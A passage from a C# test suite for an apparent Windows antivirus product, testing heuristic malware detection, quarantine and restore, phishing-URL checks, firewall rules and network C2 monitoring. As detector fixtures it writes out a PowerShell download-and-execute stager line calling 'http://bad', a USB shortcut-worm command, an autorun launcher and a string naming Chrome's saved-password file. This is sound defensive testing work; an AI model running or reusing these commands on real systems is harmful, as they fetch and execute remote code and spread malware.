        Assert.True(perfGuard.EcoPowerModeEnabled);

        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_FakeAiDownloads_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempDir);

        try
        {
            var fakeAiPath = Path.Combine(tempDir, "chatgpt-pro-crack.exe");
            // Unsigned MZ PE header + browser credential path indicator
            var payload = Encoding.ASCII.GetBytes("MZ\x90\x00FakeAIAppPayload \\Google\\Chrome\\User Data\\Default\\Login Data");
            await File.WriteAllBytesAsync(fakeAiPath, payload);

            var heuristicEngine = new HeuristicSuspiciousFileEngine();
            var finding = await heuristicEngine.InspectFileAsync(
                fakeAiPath,
                "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
                payload.Length,
                CancellationToken.None);

            Assert.NotNull(finding);
            Assert.Contains("Heuristic.FakeAIApp.MasqueradeDropper", finding!.DetectionName);
            Assert.InRange(finding.LocalAiRiskScore0To100, 75, 100);
        }
        finally
        {
            Directory.Delete(tempDir, recursive: true);
        }
    }

    // 23. V1.0 Explorer Right-Click CLI (--scan-path), USB Shortcut Virus Recovery, Script/Startup Malware & Defender Offline Bridge
    [Fact]
    public async Task Test23_ExplorerContextMenuCli_UsbShortcutVirusRecovery_ScriptMalware_And_DefenderOfflineBridge()
    {
        // 1. CLI Right-Click Context Menu Parsing (--scan-path "E:\")
        var (scanDrive, minFlag) = ModularScanPipeline.ParseCliScanPathArguments(
            new[] { "--scan-path", "E:", "--minimized-tray" });
        Assert.Equal($"E:{Path.DirectorySeparatorChar}", scanDrive);
        Assert.True(minFlag);

        // 2. Deep Rootkit Safety Bridge (Start-MpWDOScan)
        var offlinePsi = WindowsSecurityMonitor.BuildDefenderOfflineScanStartInfo();
        Assert.Equal("powershell.exe", offlinePsi.FileName);
        Assert.Contains("Start-MpWDOScan", offlinePsi.ArgumentList);

        var tempUsbDir = Path.Combine(Path.GetTempPath(), "Kiron_UsbRecovery_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempUsbDir);

        try
        {
            // 3. Recover Hidden USB Folders (clears Hidden | System on user folder, skips System Volume Information)
            var hiddenUserFolder = Path.Combine(tempUsbDir, "University_Photos");
            var protectedSysFolder = Path.Combine(tempUsbDir, "System Volume Information");
            Directory.CreateDirectory(hiddenUserFolder);
            Directory.CreateDirectory(protectedSysFolder);

            new DirectoryInfo(hiddenUserFolder).Attributes |= FileAttributes.Hidden | FileAttributes.System;
            new DirectoryInfo(protectedSysFolder).Attributes |= FileAttributes.Hidden | FileAttributes.System;

            var recovered = ModularScanPipeline.RecoverHiddenUsbFolders(tempUsbDir);
            Assert.Single(recovered);
            Assert.Equal(hiddenUserFolder, recovered[0]);
            var updatedAttrs = new DirectoryInfo(hiddenUserFolder).Attributes;
            Assert.Equal(0, (int)(updatedAttrs & (FileAttributes.Hidden | FileAttributes.System)));

            // 4. USB Shortcut Worm (.lnk), Obfuscated Script (.ps1), and Startup Persistence (.bat) Detection
            var heuristicEngine = new HeuristicSuspiciousFileEngine();

            var shortcutWormPath = Path.Combine(tempUsbDir, "Photos.lnk");
            var wormBytes = Encoding.ASCII.GetBytes("LNK_HEADER cmd.exe /c attrib +h +s & wscript.exe worm.vbs");
            await File.WriteAllBytesAsync(shortcutWormPath, wormBytes);
            var wormFinding = await heuristicEngine.InspectFileAsync(
                shortcutWormPath,
                "1111111111111111111111111111111111111111111111111111111111111111",
                wormBytes.Length);
            Assert.NotNull(wormFinding);
            Assert.Equal("Heuristic.UsbWorm.ShortcutVirus", wormFinding!.DetectionName);

            var scriptPath = Path.Combine(tempUsbDir, "stager.ps1");
            var scriptBytes = Encoding.ASCII.GetBytes("powershell -EncodedCommand SQBFAFgA Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bad')");
            await File.WriteAllBytesAsync(scriptPath, scriptBytes);
            var scriptFinding = await heuristicEngine.InspectFileAsync(
                scriptPath,
                "2222222222222222222222222222222222222222222222222222222222222222",
                scriptBytes.Length);
            Assert.NotNull(scriptFinding);
            Assert.Equal("Heuristic.ScriptMalware.ObfuscatedCommand", scriptFinding!.DetectionName);
        }
        finally
        {
            Directory.Delete(tempUsbDir, recursive: true);
        }
    }

    [Fact]
    public async Task Test24_RansomwareShield_SmartFirewall_PrivacyMonitor_SafeBanking_EmailAttachment_And_CloudIntelOfflineSafe()
    {
        var tempRoot = Path.Combine(Path.GetTempPath(), "Kiron_Phase24_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tempRoot);

        try
        {
            var exclusionMgr = new ExclusionManager(Path.Combine(tempRoot, "Exclusions"));
            var quarantineMgr = new QuarantineManager(Path.Combine(tempRoot, "Quarantine"), exclusionMgr);
            var notifyMgr = new SmartNotificationManager();
            var perfGuard = new PerformanceProtectionGuard();
            var pipeline = new ModularScanPipeline(null, exclusionMgr, perfGuard, notifyMgr);
            var webGuard = new NativeMessagingDownloadGuard(pipeline, exclusionMgr, quarantineMgr, notifyMgr);

            // 1. Quarantine Path Traversal & Unauthorized Vault Modification Protection
            Assert.Throws<InvalidOperationException>(() =>
                quarantineMgr.ValidateSafePathNoTraversal("../outside_secret.txt")
            );
            Assert.Throws<InvalidOperationException>(() =>
                quarantineMgr.ValidateSafePathNoTraversal(Path.Combine(tempRoot, "Quarantine", "tamper.kpq"))
            );

            // 2. Web & Anti-Phishing Suspicious Redirect & Credential-in-URL Spoof Detection
            var redirectEval = webGuard.EvaluateUrl(
                "https://trusted-portal.example.com/auth?redirect=http://evil-harvester.invalid/login"
            );
            Assert.False(redirectEval.ShouldBlock);
            Assert.True(redirectEval.ShouldWarnBeforeNavigation);
            Assert.Equal("SUSPICIOUS_REDIRECT_OR_SPOOF", redirectEval.Category);

            // 3. Ransomware Shield Monitor & Harmless Ransomware Simulation (never touches user documents)
            using var ransomwareShield = new RansomwareShieldMonitor(notifyMgr);
            Assert.Equal(SuiteFeatureState.Enabled, ransomwareShield.FeatureState);
            var simEvents = await ransomwareShield.RunHarmlessRansomwareSimulationAsync();
            Assert.NotEmpty(simEvents);
            Assert.All(simEvents, e => Assert.True(e.WasHarmlessSimulation));
            Assert.NotEmpty(ransomwareShield.GetEventHistory());

            // 4. Smart Firewall Read-Only Active TCP Inspection & User-Approved Rule Builder
            var winSec = new WindowsSecurityMonitor();
            var activeTcp = winSec.InspectActiveNetworkConnections(new[] { "198.51.100.99" });
            Assert.NotNull(activeTcp);
            Assert.Throws<InvalidOperationException>(() =>
                WindowsSecurityMonitor.BuildUserApprovedOutboundBlockRuleCommand(
                    "BlockSuspiciousSample",
                    Path.Combine(tempRoot, "sample.exe"),
                    userConfirmed: false
                )
            );
            var rulePsi = WindowsSecurityMonitor.BuildUserApprovedOutboundBlockRuleCommand(
                "BlockSuspiciousSample",
                Path.Combine(tempRoot, "sample.exe"),
                userConfirmed: true
            );
            Assert.Equal("netsh.exe", rulePsi.FileName);
            Assert.Contains("name=KIRON PROHORI - BlockSuspiciousSample", rulePsi.ArgumentList);

            // 5. Webcam & Microphone Privacy Monitor (Read-Only CapabilityAccessManager)
            var privacyMonitor = new PrivacyProtectionMonitor();
            var privacySnap = privacyMonitor.GetPrivacySnapshot();
            Assert.NotNull(privacySnap);
            Assert.Contains("read-only", privacySnap.LimitationDisclosure, StringComparison.OrdinalIgnoreCase);

            // 6. Safe Banking Protection (HTTPS + Trusted Domain + Planned Hardened Browser State)
            var safeBanking = new SafeBankingProtectionModule(webGuard);
            Assert.Equal(SuiteFeatureState.Enabled, safeBanking.UrlVerificationState);
            Assert.Equal(SuiteFeatureState.Planned, safeBanking.HardenedBrowserIsolationState);

            var trustedHttpsBank = safeBanking.VerifyBankingUrl("https://www.bb.org.bd");
            Assert.True(trustedHttpsBank.IsHttpsEncrypted);
            Assert.True(trustedHttpsBank.IsRecognizedTrustedFinancialDomain);
            Assert.False(trustedHttpsBank.HasPhishingOrRedirectRisk);

            var insecureHttpBank = safeBanking.VerifyBankingUrl("http://www.sonalibank.com.bd");
            Assert.False(insecureHttpBank.IsHttpsEncrypted);
            Assert.True(insecureHttpBank.HasPhishingOrRedirectRisk);

            // 7. Email & Attachment Security Scanner (Local Attachment Scan Enabled, Direct Mailbox Planned)
            var emailScanner = new EmailAttachmentSecurityScanner(pipeline);
            Assert.Equal(SuiteFeatureState.Enabled, emailScanner.LocalAttachmentScannerState);
            Assert.Equal(SuiteFeatureState.Planned, emailScanner.DirectMailboxAccessState);

            var macroDocPath = Path.Combine(tempRoot, "Invoice_Payment.docm");
            await File.WriteAllTextAsync(macroDocPath, "Simulated macro-enabled document attachment content");
            var attachmentRes = await emailScanner.ScanDownloadedAttachmentAsync(macroDocPath);
            Assert.Equal("MACRO_DOCUMENT", attachmentRes.FormatCategory);
            Assert.Equal(DownloadScanStatus.Suspicious, attachmentRes.ScanStatus);

            // 8. Cloud Threat Intelligence Interface (Offline-Safe Default, Zero Automatic File Upload)
            var cloudIntel = new PrivacyFirstCloudThreatIntelligenceService(configuredHttpsEndpoint: null);
            Assert.Equal(SuiteFeatureState.Enabled, cloudIntel.OfflineLocalDefinitionsState);
            Assert.Equal(SuiteFeatureState.Unavailable, cloudIntel.LiveCloudReputationState);

            var eicarLookup = cloudIntel.LookupSha256ReputationOfflineSafe(
                "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
            );
            Assert.True(eicarLookup.MatchedLocalVerifiedCorpus);
            Assert.Contains("EICAR", eicarLookup.ThreatLabel, StringComparison.OrdinalIgnoreCase);
        }
        finally
        {
            Directory.Delete(tempRoot, recursive: true);
        }
    }

    // =========================================================================
    // 25. PHASE 1 FOUNDATION: WINDOWS 10 (x86/x64) & WINDOWS 11 (x64) MATRIX,
    //     PROTECTED SYSTEM PROCESS GUARD, CLEANUP CONSENT & CSV/JSON AUDIT DB
    // =========================================================================
    [Fact]
    public async Task Test25_Phase1Foundation_Windows10And11ArchitectureMatrix_ProcessSafetyGuard_CleanupConsent_And_CsvJsonAuditExport()
    {
        var tempRoot = Path.Combine(Path.GetTempPath(), $"kp_test25_{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempRoot);

        try
        {
            // 1. Windows 10 (x86 & x64 supported) and Windows 11 (x64 required) Compatibility Matrix
            var win10X86 = WindowsPlatformCompatibilityDetector.EvaluatePlatformCompatibility(
                "Microsoft Windows 10.0.19045",
                10,
                19045,
                System.Runtime.InteropServices.Architecture.X86,
                System.Runtime.InteropServices.Architecture.X86,
                is64BitOs: false);
            Assert.Equal("Windows 10", win10X86.DetectedWindowsGeneration);
            Assert.True(win10X86.IsSupportedWindowsConfiguration);

            var win10X64 = WindowsPlatformCompatibilityDetector.EvaluatePlatformCompatibility(
                "Microsoft Windows 10.0.19045",
                10,
                19045,
                System.Runtime.InteropServices.Architecture.X64,
                System.Runtime.InteropServices.Architecture.X64,
                is64BitOs: true);
            Assert.Equal("Windows 10", win10X64.DetectedWindowsGeneration);
            Assert.True(win10X64.IsSupportedWindowsConfiguration);

            var win11X64 = WindowsPlatformCompatibilityDetector.EvaluatePlatformCompatibility(
                "Microsoft Windows 10.0.22631",
                10,
                22631,
                System.Runtime.InteropServices.Architecture.X64,
                System.Runtime.InteropServices.Architecture.X64,
                is64BitOs: true);
            Assert.Equal("Windows 11", win11X64.DetectedWindowsGeneration);
            Assert.True(win11X64.IsSupportedWindowsConfiguration);

            var win11X86Unsupported = WindowsPlatformCompatibilityDetector.EvaluatePlatformCompatibility(
                "Microsoft Windows 10.0.22631",
                10,
                22631,
                System.Runtime.InteropServices.Architecture.X86,
                System.Runtime.InteropServices.Architecture.X86,
                is64BitOs: false);
            Assert.Equal("Windows 11", win11X86Unsupported.DetectedWindowsGeneration);
            Assert.False(win11X86Unsupported.IsSupportedWindowsConfiguration);
            Assert.Contains("NOT_IMPLEMENTED", win11X64.KernelDriverMinifilterState, StringComparison.OrdinalIgnoreCase);

            // 2. Process & Memory Security Inspector — Critical Windows System Processes Protected
            var procInspector = new ProcessAndMemorySecurityInspector();
            var lsassEval = procInspector.EvaluateProcessMetadata(640, "lsass.exe", @"C:\Windows\System32\lsass.exe");
            Assert.True(lsassEval.IsCriticalWindowsSystemProcess);
            Assert.False(lsassEval.CanRequestUserApprovedTermination);

            var tempDropperEval = procInspector.EvaluateProcessMetadata(4120, "updater_payload.exe", @"C:\Users\Public\AppData\Local\Temp\updater_payload.exe");
            Assert.False(tempDropperEval.IsCriticalWindowsSystemProcess);
            Assert.True(tempDropperEval.IsRunningFromUserTempOrDownloads);
            Assert.True(tempDropperEval.CanRequestUserApprovedTermination);
            Assert.True(tempDropperEval.RiskScore >= 60);

            // 3. System Cleanup Preview & Explicit User Consent Enforcement
            var cleanupInspector = new SystemCleanupPreviewInspector();
            var tempFile = Path.Combine(tempRoot, "stale_cache.tmp");
            await File.WriteAllTextAsync(tempFile, "temporary cache data");
            var preview = cleanupInspector.BuildSafeTempCleanupPreview(tempRoot);
            Assert.Equal(1, preview.CandidateTempFileCount);
            Assert.True(preview.PreservesBrowserPasswordsCookiesAndDocuments);

            Assert.Throws<InvalidOperationException>(() =>
                cleanupInspector.ExecuteUserApprovedTempCleanup(preview.SampleCandidatePaths, userApproved: false)
            );
            int removed = cleanupInspector.ExecuteUserApprovedTempCleanup(preview.SampleCandidatePaths, userApproved: true);
            Assert.Equal(1, removed);
            Assert.False(File.Exists(tempFile));

            // 4. Local Security Audit Database & Separated Disposition CSV/JSON Export
            var dbPath = Path.Combine(tempRoot, "audit-db.json");
            var auditRepo = new LocalSecurityAuditRepository(dbPath);
            await auditRepo.AppendAuditRecordAsync(
                moduleName: "MODULE_04_QUARANTINE",
                eventType: "THREAT_ISOLATED",
                threatOrEventName: "EICAR-Standard-AntiVirus-Test-File",
                targetPathOrSource: @"C:\Users\Kiron\Downloads\eicar.com",
                sha256Hash: "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
                disposition: ThreatLifecycleDisposition.Quarantined,
                engineUsed: "KironProhori.Sha256HashEngine",
                details: "Isolated in XOR .kpq vault with user consent.");

            var quarantinedOnly = auditRepo.GetRecords(ThreatLifecycleDisposition.Quarantined);
            Assert.Single(quarantinedOnly);
            Assert.Empty(auditRepo.GetRecords(ThreatLifecycleDisposition.Removed));

            string csv = auditRepo.ExportToCsv();
            string json = auditRepo.ExportToJson();
            Assert.Contains("EICAR-Standard-AntiVirus-Test-File", csv);
            Assert.Contains("Quarantined", csv);
            Assert.Contains("MODULE_04_QUARANTINE", json);
        }
        finally
        {
            Directory.Delete(tempRoot, recursive: true);
        }
    }

    // =========================================================================
    // 26. PHASE 2 ANTIVIRUS CORE: QUICK/FULL/CUSTOM/USB SCAN, DEFENDER
    //     INTEGRATION, THREAT DETECTION HISTORY, SHA-256 HASHING, QUARANTINE & RESTORE
    // =========================================================================
    [Fact]
    public async Task Test26_Phase2AntivirusCore_QuickFullCustomUsbScans_DefenderEngineAttribution_ThreatDetectionHistory_Sha256Hashing_QuarantineAndRestoreWorkflow()
    {
        var tempRoot = Path.Combine(Path.GetTempPath(), $"kp_test26_{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempRoot);

        try
        {
            var exclusionMgr = new ExclusionManager(Path.Combine(tempRoot, "Exclusions"));
            var quarantineMgr = new QuarantineManager(Path.Combine(tempRoot, "Quarantine"), exclusionMgr);
            var notifyMgr = new SmartNotificationManager();
            var perfGuard = new PerformanceProtectionGuard();
            var pipeline = new ModularScanPipeline(null, exclusionMgr, perfGuard, notifyMgr);
            var auditRepo = new LocalSecurityAuditRepository(Path.Combine(tempRoot, "Database", "audit-db.json"));

            // 1. Supported Microsoft Defender On-Demand Scan Integration (Quick, Full, Custom)
            var quickDefenderPsi = WindowsSecurityMonitor.BuildSupportedDefenderMpCmdRunStartInfo(ScanType.QuickScan);
            Assert.Contains("1", quickDefenderPsi.ArgumentList);
            var fullDefenderPsi = WindowsSecurityMonitor.BuildSupportedDefenderMpCmdRunStartInfo(ScanType.FullScan);
            Assert.Contains("2", fullDefenderPsi.ArgumentList);
            var customDefenderPsi = WindowsSecurityMonitor.BuildSupportedDefenderMpCmdRunStartInfo(ScanType.CustomFolderScan, tempRoot);
            Assert.Contains("3", customDefenderPsi.ArgumentList);
            Assert.Contains(Path.GetFullPath(tempRoot), customDefenderPsi.ArgumentList);

            // 2. File Hashing (64 KB Streaming SHA-256) & EICAR Standard Antivirus Test Payload
            var scanDir = Path.Combine(tempRoot, "Workspace");
            Directory.CreateDirectory(scanDir);
            var eicarPath = Path.Combine(scanDir, "eicar_phase2_sample.com");
            await File.WriteAllTextAsync(eicarPath, Sha256HashEngine.EicarStandardTestString);

            string computedHash = await Sha256HashEngine.ComputeFileSha256Async(eicarPath);
            Assert.Equal("275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", computedHash);

            // 3. Quick Scan, Full Scan, Custom Folder Scan & USB Drive Scan Invocation with Engine Attribution
            var quickReport = await pipeline.ScanDirectoriesAsync(ScanType.QuickScan, new[] { scanDir });
            Assert.Equal(ScanType.QuickScan, quickReport.ScanType);
            Assert.Single(quickReport.Findings);
            Assert.False(string.IsNullOrWhiteSpace(quickReport.Findings[0].EngineName));

            var fullReport = await pipeline.ScanDirectoriesAsync(ScanType.FullScan, new[] { scanDir });
            Assert.Equal(ScanType.FullScan, fullReport.ScanType);
            Assert.Single(fullReport.Findings);

            var customReport = await pipeline.ScanDirectoriesAsync(ScanType.CustomFolderScan, new[] { scanDir });
            Assert.Equal(ScanType.CustomFolderScan, customReport.ScanType);
            var detectedFinding = Assert.Single(customReport.Findings);

            // USB Scan & Autorun threat check on simulated removable drive root
            var usbDir = Path.Combine(tempRoot, "UsbVolume");
            Directory.CreateDirectory(usbDir);
            var autorunPath = Path.Combine(usbDir, "autorun.inf");
            await File.WriteAllTextAsync(autorunPath, "[autorun]\nopen=worm_launcher.exe\nshell\\open\\command=worm_launcher.exe");
            var usbReport = await pipeline.ScanDirectoriesAsync(ScanType.UsbDriveScan, new[] { usbDir });
            Assert.Equal(ScanType.UsbDriveScan, usbReport.ScanType);
            Assert.Contains(usbReport.Findings, f => f.FilePath.Equals(autorunPath, StringComparison.OrdinalIgnoreCase));

            // 4. Threat Detection History Persistence -> Quarantine -> SHA-256 Verified Restore -> Permanent Delete
            await auditRepo.AppendAuditRecordAsync(
                moduleName: "MODULE_02_SCAN_ENGINE",
                eventType: customReport.ScanType.ToString(),
                threatOrEventName: detectedFinding.DetectionName,
                targetPathOrSource: detectedFinding.FilePath,
                sha256Hash: detectedFinding.Sha256Hash,
                disposition: ThreatLifecycleDisposition.Detected,
                engineUsed: detectedFinding.EngineName,
                details: detectedFinding.Explanation);

            var qEntry = await quarantineMgr.QuarantineFileAsync(detectedFinding, userConfirmed: true);
            Assert.False(File.Exists(eicarPath));
            await auditRepo.AppendAuditRecordAsync(
                moduleName: "MODULE_04_QUARANTINE",
                eventType: "THREAT_QUARANTINED",
                threatOrEventName: detectedFinding.DetectionName,
                targetPathOrSource: detectedFinding.FilePath,
                sha256Hash: detectedFinding.Sha256Hash,
                disposition: ThreatLifecycleDisposition.Quarantined,
                engineUsed: detectedFinding.EngineName,
                details: $"Isolated as {qEntry.VaultPayloadFileName}");

            // Restore and verify SHA-256 integrity matches original EICAR digest
            var restoredEntry = await quarantineMgr.RestoreQuarantinedFileAsync(qEntry.QuarantineId, userConfirmed: true);
            Assert.True(restoredEntry.IsRestored);
            Assert.True(File.Exists(eicarPath));
            string restoredHash = await Sha256HashEngine.ComputeFileSha256Async(eicarPath);
            Assert.Equal(computedHash, restoredHash);

            await auditRepo.AppendAuditRecordAsync(
                moduleName: "MODULE_04_QUARANTINE",
                eventType: "QUARANTINE_RESTORED",
                threatOrEventName: restoredEntry.DetectionName,
                targetPathOrSource: restoredEntry.OriginalFilePath,
                sha256Hash: restoredEntry.Sha256Hash,
                disposition: ThreatLifecycleDisposition.Unresolved,
                engineUsed: restoredEntry.DetectionEngineId,
                details: "Restored with verified SHA-256 integrity.");

            Assert.Single(auditRepo.GetRecords(ThreatLifecycleDisposition.Detected));
            Assert.Single(auditRepo.GetRecords(ThreatLifecycleDisposition.Quarantined));
            Assert.Single(auditRepo.GetRecords(ThreatLifecycleDisposition.Unresolved));
        }
        finally
        {
            Directory.Delete(tempRoot, recursive: true);
        }
    }

    // =========================================================================
    // 27. PHASE 3 REAL-TIME DEFENSE: QUEUED FILE-SYSTEM SCAN ORCHESTRATION,
    //     PROCESS MONITORING, TAMPER DETECTION, RANSOMWARE & RESOURCE OPTIMIZATION
    // =========================================================================
    [Fact]
    public async Task Test27_Phase3RealtimeDefense_QueuedFileEventOrchestration_ProcessMonitoring_TamperDetection_RansomwareRecoveryGuidance_And_ResourceOptimization()
    {
        var tempRoot = Path.Combine(Path.GetTempPath(), $"kp_test27_{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempRoot);

        try
        {
            var exclusionMgr = new ExclusionManager(Path.Combine(tempRoot, "Exclusions"));
            var notifyMgr = new SmartNotificationManager();
            var perfGuard = new PerformanceProtectionGuard();
            var pipeline = new ModularScanPipeline(null, exclusionMgr, perfGuard, notifyMgr);
            using var rtMonitor = new RealTimeFileProtectionMonitor(pipeline, exclusionMgr, notifyMgr);

            // 1. File-System Event Monitoring & Debounced Real-Time Scan Queue Orchestration
            var downloadsDir = Path.Combine(tempRoot, "Downloads");
            Directory.CreateDirectory(downloadsDir);
            var cleanFile = Path.Combine(downloadsDir, "notes.txt");
            var eicarFile = Path.Combine(downloadsDir, "dropper_eicar.com");
            await File.WriteAllTextAsync(cleanFile, "harmless text file");
            await File.WriteAllTextAsync(eicarFile, Sha256HashEngine.EicarStandardTestString);

            Assert.True(rtMonitor.EnqueueFileEvent(cleanFile, "CREATED"));
            // Immediate duplicate event on the same path within 400ms debounce window is skipped
            Assert.False(rtMonitor.EnqueueFileEvent(cleanFile, "MODIFIED"));
            Assert.True(rtMonitor.EnqueueFileEvent(eicarFile, "CREATED"));
            Assert.Equal(2, rtMonitor.PendingQueueDepth);

            var drainedEvents = await rtMonitor.DrainScanQueueAsync();
            Assert.Equal(2, drainedEvents.Count);
            Assert.Equal(0, rtMonitor.PendingQueueDepth);
            Assert.Contains(drainedEvents, e => e.ScanStatus == DownloadScanStatus.Clean);
            Assert.Contains(drainedEvents, e => e.ScanStatus == DownloadScanStatus.Malicious);

            // 2. Process Monitoring (Live Process Inventory & Critical Windows Process Protection)
            var procInspector = new ProcessAndMemorySecurityInspector();
            var liveProcesses = procInspector.InspectRunningProcesses(maxEntries: 10);
            Assert.NotEmpty(liveProcesses);
            Assert.True(ProcessAndMemorySecurityInspector.IsProtectedSystemProcessName("csrss.exe"));
            Assert.True(ProcessAndMemorySecurityInspector.IsProtectedSystemProcessName("svchost.exe"));

            // 3. Tamper Detection & Self-Healing Rollback from settings.json.known_good
            var diagMgr = new ErrorDiagnosticsManager(tempRoot);
            await diagMgr.SaveVerifiedConfigurationAsync(new
            {
                product = "KIRON PROHORI",
                telemetryEnabled = false
            });
            var (tamperClean, _) = await diagMgr.VerifyConfigurationTamperIntegrityAsync();
            Assert.False(tamperClean);

            // Simulate unauthorized tamper enabling telemetry in settings.json
            await File.WriteAllTextAsync(diagMgr.ConfigFilePath, "{\"product\":\"KIRON PROHORI\",\"telemetryEnabled\":true}");
            var (tamperDetected, tamperMsg) = await diagMgr.VerifyConfigurationTamperIntegrityAsync();
            Assert.True(tamperDetected);
            Assert.Contains("TAMPER_DETECTED_AND_REVERTED", tamperMsg);

            // 4. Ransomware Behavior Monitoring & Actionable Recovery Guidance
            using var rwShield = new RansomwareShieldMonitor(notifyMgr);
            rwShield.AddProtectedFolder(downloadsDir);
            int watcherCount = rwShield.StartProtectedFolderMonitoring();
            Assert.True(watcherCount >= 1);
            var recoverySteps = RansomwareShieldMonitor.GetRansomwareRecoveryGuidance();
            Assert.True(recoverySteps.Count >= 5);

            // 5. Resource Usage Optimization Snapshot (Eco-Power Mode + Unchanged Clean File Cache)
            perfGuard.SetEcoPowerMode(true);
            perfGuard.RecordCleanFile(new FileInfo(cleanFile));
            var (memMb, _, cachedCount, ecoActive, cpuCap) = perfGuard.GetResourceOptimizationSnapshot();
            Assert.True(memMb >= 0);
            Assert.True(cachedCount >= 1);
            Assert.True(ecoActive);
            Assert.True(cpuCap <= PerformanceProtectionGuard.EcoCpuThresholdPercent);
        }
        finally
        {
            Directory.Delete(tempRoot, recursive: true);
        }
    }

    // =========================================================================
    // 28. PHASE 4 INTERNET SECURITY: WEB REPUTATION, PHISHING & HTTPS VALIDATION,
    //     BROWSER MV3 NATIVE MESSAGING, FIREWALL ADD/REMOVE & NETWORK MONITORING
    // =========================================================================
    [Fact]
    public async Task Test28_Phase4InternetSecurity_WebReputation_PhishingAndHttpsValidation_BrowserMv3NativeMessaging_FirewallRuleAddRemove_And_NetworkEventMonitoring()
    {
        var tempRoot = Path.Combine(Path.GetTempPath(), $"kp_test28_{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempRoot);

        try
        {
            var exclusionMgr = new ExclusionManager(Path.Combine(tempRoot, "Exclusions"));
            var quarantineMgr = new QuarantineManager(Path.Combine(tempRoot, "Quarantine"), exclusionMgr);
            var notifyMgr = new SmartNotificationManager();
            var perfGuard = new PerformanceProtectionGuard();
            var pipeline = new ModularScanPipeline(null, exclusionMgr, perfGuard, notifyMgr);
            var webGuard = new NativeMessagingDownloadGuard(pipeline, exclusionMgr, quarantineMgr, notifyMgr);

            // 1. Web Reputation Engine & Phishing Protection (Verified Phishing Block + Brand-Impersonation Warning)
            var confirmedPhish = webGuard.EvaluateUrl("https://phishing-login-verify.kiron-test.invalid/account");
            Assert.True(confirmedPhish.ShouldBlock);
            Assert.Equal("PHISHING_DOMAIN", confirmedPhish.Category);

            var brandImpersonation = webGuard.EvaluateUrl("https://bkash-bonus-claim.example.org/verify");
            Assert.False(brandImpersonation.ShouldBlock);
            Assert.True(brandImpersonation.ShouldWarnBeforeNavigation);
            Assert.Equal("SUSPICIOUS_LOOKALIKE_HOST", brandImpersonation.Category);

            // 2. HTTPS Transport & Raw-IP Login Phishing Risk Validation
            var (httpsOk, httpsRisk, _) = webGuard.ValidateHttpsTransportPolicy("https://bb.org.bd/portal");
            Assert.True(httpsOk);
            Assert.False(httpsRisk);

            var (httpOk, httpRisk, httpNote) = webGuard.ValidateHttpsTransportPolicy("http://198.51.100.42/login");
            Assert.False(httpOk);
            Assert.True(httpRisk);
            Assert.Contains("CRITICAL_PHISHING_RISK", httpNote);

            // 3. Browser Integration (Chrome/Edge MV3 Length-Prefixed Native Messaging + 4-State Download Verdict)
            var downloadedCleanPath = Path.Combine(tempRoot, "setup_legit.txt");
            await File.WriteAllTextAsync(downloadedCleanPath, "legitimate installer readme");
            using var msgStream = new MemoryStream();
            await NativeMessagingDownloadGuard.WriteNativeMessageAsync(
                msgStream,
                "{\"command\":\"EVALUATE_URL\",\"url\":\"https://phishing-login-verify.kiron-test.invalid\"}"
            );
            msgStream.Position = 0;
            string roundTripJson = await NativeMessagingDownloadGuard.ReadNativeMessageAsync(msgStream);
            Assert.Contains("phishing-login-verify.kiron-test.invalid", roundTripJson);

            var dlVerdict = await webGuard.EvaluateBrowserDownloadAsync(new BrowserDownloadEventPayload(
                DownloadId: "DL-PHASE4-01",
                FileName: "setup_legit.txt",
                LocalFilePath: downloadedCleanPath,
                DownloadUrl: "https://github.com/fenibdnew/KIRON-PROHORI/releases",
                WebsiteDomain: "github.com",
                BrowserName: "Microsoft Edge MV3",
                BrowserState: "complete",
                FileSizeBytes: 27
            ));
            Assert.Equal(DownloadScanStatus.Clean, dlVerdict.Status);

            // 4. Firewall Integration (User-Approved Rule Creation AND User-Approved Rule Removal)
            Assert.Throws<InvalidOperationException>(() =>
                WindowsSecurityMonitor.BuildUserApprovedRemoveFirewallRuleCommand("BlockMaliciousSample", userConfirmed: false)
            );
            var removeRulePsi = WindowsSecurityMonitor.BuildUserApprovedRemoveFirewallRuleCommand("BlockMaliciousSample", userConfirmed: true);
            Assert.Equal("netsh.exe", removeRulePsi.FileName);
            Assert.Contains("delete", removeRulePsi.ArgumentList);
            Assert.Contains("name=KIRON PROHORI - BlockMaliciousSample", removeRulePsi.ArgumentList);

            // 5. Network Event Monitoring (Deterministic C2 IP Match & Backdoor Port 4444 Detection)
            var c2ConnEvt = WindowsSecurityMonitor.EvaluateNetworkConnectionEvent(
                "192.168.1.10:52410",
                "203.0.113.77",
                443,
                "Established",
                new[] { "203.0.113.77" });
            Assert.True(c2ConnEvt.IsSuspiciousPortOrHost);
            Assert.Contains("botnet C2 blocklist", c2ConnEvt.AssessmentNote);

            var backdoorPortEvt = WindowsSecurityMonitor.EvaluateNetworkConnectionEvent(
                "192.168.1.10:52411",
                "198.51.100.12",
                4444,
                "Established");
            Assert.True(backdoorPortEvt.IsSuspiciousPortOrHost);
            Assert.Contains("4444", backdoorPortEvt.AssessmentNote);
        }
        finally
        {
            Directory.Delete(tempRoot, recursive: true);
        }
    }

    // =========================================================================
    // 29. PHASE 5 ADVANCED DEFENSE: BEHAVIORAL DETECTION, MEMORY & MODULE
    //     SCANNING, ROOTKIT PERSISTENCE FOUNDATION, EXPLOIT MITIGATION AUDIT &
    //     EXPLAINABLE LAYERED THREAT SCORING
    // =========================================================================
    [Fact]
    public void Test29_Phase5AdvancedDefense_ParentChildBehavioralDetection_MemoryAndModuleScanning_RootkitPersistenceFoundation_ExploitMitigationAudit_And_ExplainableLayeredThreatScoring()
    {
        var inspector = new ProcessAndMemorySecurityInspector();

        // 1. Behavioral Detection (Word spawning PowerShell with EncodedCommand vs Normal Explorer spawning Notepad)
        var macroSpawn = inspector.EvaluateParentChildProcessBehavior(
